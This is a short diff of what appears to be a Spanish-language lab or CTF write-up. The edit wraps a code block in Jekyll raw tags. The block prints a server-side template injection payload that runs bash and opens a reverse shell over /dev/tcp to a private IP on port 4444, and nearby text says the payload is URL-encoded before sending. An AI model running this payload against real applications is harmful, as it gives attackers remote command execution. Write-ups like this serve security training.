@@ -222,9 +222,11 @@ Ahora que tenemos una inyección SSTI podemos realizar RCE para obtener una shel
 
 ## Shell reversa
 
+{% raw %}
 ```python
 {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.100.210/4444 0>&1"')}}
 ```
+{% endraw %}
 
 Encodeamos el payload en URL antes de enviarlo a la aplicación.
 
